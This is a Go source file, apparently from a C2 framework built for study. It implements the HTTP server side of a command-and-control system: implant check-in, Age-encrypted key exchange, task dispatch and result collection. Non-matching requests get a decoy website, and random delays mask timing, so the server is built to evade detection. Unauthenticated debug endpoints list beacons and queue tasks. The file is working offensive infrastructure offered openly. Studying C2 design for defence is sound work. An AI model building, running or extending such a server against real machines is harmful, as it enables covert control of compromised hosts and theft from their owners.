// Package c2 implements the C2 server's HTTP transport layer, including
// beacon registration, task dispatch, Age key exchange, and session management.
// It also serves a decoy website for non-beacon HTTP requests.
package c2

import (
	cryptorand "crypto/rand"
	_ "embed"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand/v2"
	"net/http"
	"path/filepath"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"xhc2_for_studying/protocol"
	beaconProtocol "xhc2_for_studying/protocol/beacon"
	"xhc2_for_studying/server/core"
	"xhc2_for_studying/server/handlers"
	"xhc2_for_studying/server/store"
)

//go:embed webroot/index.html
var websiteHTML []byte

// HTTPServer is the main C2 HTTP server. It handles beacon check-ins,
// key exchange, and task dispatch, and serves a decoy website for
// non-beacon HTTP requests.
type HTTPServer struct {
	engine        *gin.Engine
	beaconStore   store.BeaconStore
	taskStore     store.ServerTaskStore
	sessionStore  *store.SessionStore
	implantStore  store.ImplantStore
	agePrivateKey string
	c2Profile     *protocol.C2Profile
}

type debugCreateTaskRequest struct {
	TaskID    string `json:"task_id"`
	ImplantID string `json:"implant_id"`
	Type      string `json:"type"`
	Payload   string `json:"payload"`
}

// NewHTTPServer creates a new C2 HTTP server with the given stores,
// Age private key, and C2 profile. It registers all routes and returns
// a ready-to-run server.
func NewHTTPServer(
	beaconStore store.BeaconStore,
	taskStore store.ServerTaskStore,
	sessionStore *store.SessionStore,
	implantStore store.ImplantStore,
	agePrivateKey string,
	c2Profile *protocol.C2Profile,
) *HTTPServer {
	engine := gin.New()
	engine.Use(gin.Recovery(), gin.Logger())

	srv := &HTTPServer{
		engine:        engine,
		beaconStore:   beaconStore,
		taskStore:     taskStore,
		sessionStore:  sessionStore,
		implantStore:  implantStore,
		agePrivateKey: agePrivateKey,
		c2Profile:     c2Profile,
	}

	srv.registerRoutes()
	return srv
}

// registerRoutes configures the HTTP routes for this server.
func (s *HTTPServer) registerRoutes() {
	s.engine.GET("/healthz", s.handleHealthz)
	s.engine.GET("/debug/beacons", s.handleListBeacons)
	s.engine.POST("/debug/tasks", s.handleCreateDebugTask)
	s.engine.NoRoute(s.handleC2Request)
}

// Run starts the HTTP C2 server on the given address. It blocks until
// the server stops.
func (s *HTTPServer) Run(addr string) error {
	return s.engine.Run(addr)
}

// handleC2Request is the catch-all C2 handler. It dispatches requests
// based on HTTP method, session token, and URL extension to the
// appropriate handler (key exchange, session-based, or decoy).
func (s *HTTPServer) handleC2Request(c *gin.Context) {
	rawBody, err := io.ReadAll(c.Request.Body)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	// Extract the encoder negotiation nonce from the "_" URL query parameter.
	enc, ok := s.extractEncoder(c)
	if !ok {
		s.serveWebsite(c)
		return
	}

	ext := filepath.Ext(c.Request.URL.Path)

	// If a valid session token exists, dispatch via the associated ExtMap.
	sessionToken := s.sessionTokenFromRequest(c.Request)
	if session := s.sessionStore.Get(sessionToken); session != nil {
		s.handleSessionRequest(c, rawBody, enc, ext, session)
		return
	}

	// If the URL extension matches the key-exchange pool, attempt key exchange.
	// Fall back to the decoy page on failure.
	if c.Request.Method == http.MethodPost && s.c2Profile.IsKeyExchangeExt(ext) {
		s.handleKeyExchange(c, rawBody, enc)
		return
	}

	// Neither session nor key exchange applies: sleep with random timing to
	// mask any Age decryption timing difference, then serve the decoy page.
	randomTimingSleep()
	s.serveWebsite(c)
}

// handleSessionRequest processes a C2 request for an already-established session.
// It decodes and decrypts the body, dispatches based on the message type, and
// returns an encrypted response.
func (s *HTTPServer) handleSessionRequest(c *gin.Context, rawBody []byte, enc protocol.Encoder, ext string, session *store.Session) {
	msgType := session.ExtMap.ExtToMsgType(ext)
	if msgType == protocol.MsgPoll {
		if c.Request.Method != http.MethodGet {
			s.serveWebsite(c)
			return
		}
		respBody := s.handlePollEncrypted(c.ClientIP(), session)
		s.writeEncryptedResponse(c, enc, session, respBody)
		return
	}

	decoded, err := enc.Decode(rawBody)
	if err != nil {
		s.serveWebsite(c)
		return
	}
	plaintext, err := session.CipherCtx.Decrypt(decoded)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	var respBody []byte
	switch msgType {
	case protocol.MsgRegister:
		if c.Request.Method != http.MethodPost {
			s.serveWebsite(c)
			return
		}
		respBody = s.handleRegisterEncrypted(plaintext, c.ClientIP(), session)
	case protocol.MsgResult:
		if c.Request.Method != http.MethodPost {
			s.serveWebsite(c)
			return
		}
		respBody = s.handleResultEncrypted(plaintext, c.ClientIP())
	default:
		s.serveWebsite(c)
		return
	}
	s.writeEncryptedResponse(c, enc, session, respBody)
}

func (s *HTTPServer) writeEncryptedResponse(c *gin.Context, enc protocol.Encoder, session *store.Session, respBody []byte) {
	respPacket, _, err := session.CipherCtx.Encrypt(respBody)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "encrypt response"})
		return
	}
	encodedResp, err := enc.Encode(respPacket)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "encode response"})
		return
	}

	c.Data(http.StatusOK, "application/octet-stream", encodedResp)
}

func (s *HTTPServer) sessionTokenFromRequest(req *http.Request) string {
	cookie, err := req.Cookie(s.sessionCookieName())
	if err == nil {
		return cookie.Value
	}
	return req.Header.Get("X-Session-Token")
}

func (s *HTTPServer) sessionCookieName() string {
	if s.c2Profile != nil && s.c2Profile.SessionCookieName != "" {
		return s.c2Profile.SessionCookieName
	}
	return "sid"
}

// handleKeyExchange performs an Age-based key exchange. It decodes the
// payload, verifies the HMAC, decrypts the symmetric key, creates a cipher
// context with a new session token, and returns the encrypted token.
func (s *HTTPServer) handleKeyExchange(c *gin.Context, rawBody []byte, enc protocol.Encoder) {
	// Step 1: Decode using the negotiated encoder.
	decoded, err := enc.Decode(rawBody)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	// Step 2: Extract the public key digest and look up the implant record.
	digest, ok := protocol.ExtractPubKeyDigest(decoded)
	if !ok {
		s.serveWebsite(c)
		return
	}
	record, ok := s.implantStore.Get(digest)
	if !ok {
		s.serveWebsite(c)
		return
	}

	// Step 3: Verify HMAC and decrypt to obtain the symmetric key.
	sKey, err := protocol.VerifyAndDecryptKeyExchange(decoded, s.agePrivateKey, record.ImplantAgePrivateKey)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	// Step 4: Create a CipherContext and generate a session token.
	cipherCtx, err := protocol.NewCipherContext(sKey)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	sessionToken := generateSessionToken()
	http.SetCookie(c.Writer, &http.Cookie{
		Name:     s.sessionCookieName(),
		Value:    sessionToken,
		Path:     "/",
		HttpOnly: true,
	})
	s.sessionStore.Set(sessionToken, &store.Session{
		CipherCtx: cipherCtx,
		ExtMap:    record.ExtMap,
	})

	// Step 5: Encrypt the session token, encode with the same encoder, and respond.
	respPacket, _, err := cipherCtx.Encrypt([]byte(sessionToken))
	if err != nil {
		s.serveWebsite(c)
		return
	}
	encodedResp, err := enc.Encode(respPacket)
	if err != nil {
		s.serveWebsite(c)
		return
	}

	c.Data(http.StatusOK, "application/octet-stream", encodedResp)
}

// generateSessionToken returns a new random 16-byte session token as a hex string.
func generateSessionToken() string {
	b := make([]byte, 16)
	if _, err := cryptorand.Read(b); err != nil {
		panic("crypto/rand.Read failed: " + err.Error())
	}
	return hex.EncodeToString(b)
}

// handleRegisterEncrypted decrypts and processes an encrypted register request.
func (s *HTTPServer) handleRegisterEncrypted(body []byte, remoteAddr string, session *store.Session) []byte {
	var req beaconProtocol.RegisterRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return mustMarshalError("invalid register request")
	}

	resp, err := handlers.HandleRegister(s.beaconStore, s.sessionStore, &req, remoteAddr)
	if err != nil {
		return mustMarshalError(err.Error())
	}
	if session != nil {
		session.BeaconID = resp.BeaconID
	}
	return mustMarshalJSON(resp)
}

// handlePollEncrypted decrypts and processes an encrypted poll request.
func (s *HTTPServer) handlePollEncrypted(remoteAddr string, session *store.Session) []byte {
	if session == nil || session.BeaconID == "" {
		return mustMarshalError("beacon is not registered")
	}
	req := beaconProtocol.PollRequest{BeaconID: session.BeaconID}
	resp, err := handlers.HandlePoll(s.beaconStore, s.taskStore, &req, remoteAddr)
	if err != nil {
		return mustMarshalError(err.Error())
	}
	return mustMarshalJSON(resp)
}

// handleResultEncrypted decrypts and processes an encrypted result request.
func (s *HTTPServer) handleResultEncrypted(body []byte, remoteAddr string) []byte {
	var req beaconProtocol.ResultRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return mustMarshalError("invalid result request")
	}

	resp, err := handlers.HandleResult(s.beaconStore, s.taskStore, &req, remoteAddr)
	if err != nil {
		return mustMarshalError(err.Error())
	}
	return mustMarshalJSON(resp)
}

// extractEncoder extracts the encoder negotiation nonce from the "_" URL query parameter and returns the corresponding Encoder.
func (s *HTTPServer) extractEncoder(c *gin.Context) (protocol.Encoder, bool) {
	nonceStr := c.Query("_")
	if nonceStr == "" {
		return nil, false
	}
	nonce, err := strconv.Atoi(nonceStr)
	if err != nil {
		return nil, false
	}
	encoderID := protocol.ExtractEncoderID(nonce, s.c2Profile.EncoderModulus)
	return protocol.GetEncoderByID(encoderID)
}

// randomTimingSleep adds a random delay (20-80ms) before serving a decoy
// response. This masks any timing difference from Age decryption on the
// key-exchange path.
func randomTimingSleep() {
	// Sleep for 20-80ms, covering the typical Age decryption duration.
	time.Sleep(20*time.Millisecond + time.Duration(rand.IntN(60))*time.Millisecond)
}

// serveWebsite responds with the embedded decoy website HTML.
func (s *HTTPServer) serveWebsite(c *gin.Context) {
	c.Data(http.StatusOK, "text/html; charset=utf-8", websiteHTML)
}

// mustMarshalJSON marshals v to JSON. On failure it returns a generic error JSON.
func mustMarshalJSON(v any) []byte {
	data, err := json.Marshal(v)
	if err != nil {
		return []byte(`{"error":"marshal failed"}`)
	}
	return data
}

// mustMarshalError returns a JSON-encoded error object with the given message.
func mustMarshalError(msg string) []byte {
	return mustMarshalJSON(gin.H{"error": msg})
}

// handleHealthz is a health-check endpoint.
func (s *HTTPServer) handleHealthz(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": "ok"})
}

// handleListBeacons returns a list of all registered beacon IDs.
func (s *HTTPServer) handleListBeacons(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"beacon_ids": s.beaconStore.ListIDs()})
}

// handleCreateDebugTask creates a task directly via HTTP for debugging purposes.
func (s *HTTPServer) handleCreateDebugTask(c *gin.Context) {
	var req debugCreateTaskRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.ImplantID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "implant_id is required"})
		return
	}
	if req.Type == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "type is required"})
		return
	}

	taskID := req.TaskID
	if taskID == "" {
		taskID = fmt.Sprintf("task-%d", time.Now().UnixNano())
	}

	task := &core.ServerTask{
		TaskID:    taskID,
		Type:      req.Type,
		ImplantID: req.ImplantID,
		Payload:   req.Payload,
		Status:    "pending",
		CreatedAt: time.Now(),
	}
	if err := s.taskStore.AddTask(task); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "ok",
		"task": gin.H{
			"task_id":    task.TaskID,
			"implant_id": task.ImplantID,
			"type":       task.Type,
			"payload":    task.Payload,
			"status":     task.Status,
		},
	})
}
